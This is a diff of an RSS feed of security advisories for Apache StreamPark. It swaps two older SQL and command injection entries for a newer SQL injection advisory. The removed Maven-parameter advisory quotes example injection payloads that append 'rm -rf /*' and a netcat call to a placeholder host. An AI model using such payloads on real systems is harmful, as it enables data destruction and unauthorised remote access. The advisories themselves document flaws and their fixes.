@@ -6,43 +6,21 @@
     <description>The latest CVEs for Apache Software Foundation -- Apache StreamPark (incubating)</description>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Wed, 12 Jun 2024 11:24:32 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 16 Jul 2024 09:23:29 +0000</lastBuildDate>
     <ttl>60</ttl>
     <item>
-      <title>CVE-2023-49898|2023-12-15T12:13:25.086Z -- apache%20software%20foundation -- apache%20streampark%20%28incubating%29
+      <title>CVE-2023-52290|2024-07-16T07:37:38.660Z -- apache%20software%20foundation -- apache%20streampark%20%28incubating%29
 </title>
-      <link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49898</link>
-      <description>In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.
+      <link>https://www.cve.org/CVERecord?id=CVE-2023-52290</link>
+      <description>In streampark-console the list pages(e.g: application pages), users can sort page by field. This sort field is sent from the front-end to the back-end, and the SQL query is generated using this field. However, because this sort field isn't validated, there is a risk of SQL injection vulnerability. The attacker must successfully log into the system to launch an attack, which may cause data leakage. Since no data will be written, so this is a low-impact vulnerability.
 
 Mitigation:
 
-all users should upgrade to 2.1.2
-
-Example:
-
-##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &amp;&amp;, compilation failure use "||" or "&amp;&amp;":
-
-/usr/share/java/maven-3/conf/settings.xml || rm -rf /*
-
-/usr/share/java/maven-3/conf/settings.xml &amp;&amp; nohup nc x.x.x.x 8899 &amp;
+all users should upgrade to 2.1.4,  Such parameters will be blocked.
 
 </description>
-      <guid isPermaLink="false">CVE-2023-49898|2023-12-15T12:13:25.086Z</guid>
-      <pubDate>Fri, 15 Dec 2023 12:13:25 +0000</pubDate>
-    </item>
-    <item>
-      <title>CVE-2023-30867|2023-12-15T12:14:02.074Z -- apache%20software%20foundation -- apache%20streampark%20%28incubating%29
-</title>
-      <link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30867</link>
-      <description>In the Streampark platform, when users log in to the system and use certain features, some pages provide a name-based fuzzy search, such as job names, role names, etc. The sql syntax :select * from table where jobName like '%jobName%'. However, the jobName field may receive illegal parameters, leading to SQL injection. This could potentially result in information leakage.
-
-Mitigation:
-
-Users are recommended to upgrade to version 2.1.2, which fixes the issue.
-
-</description>
-      <guid isPermaLink="false">CVE-2023-30867|2023-12-15T12:14:02.074Z</guid>
-      <pubDate>Fri, 15 Dec 2023 12:14:02 +0000</pubDate>
+      <guid isPermaLink="false">CVE-2023-52290|2024-07-16T07:37:38.660Z</guid>
+      <pubDate>Tue, 16 Jul 2024 07:37:38 +0000</pubDate>
     </item>
   </channel>
 </rss>
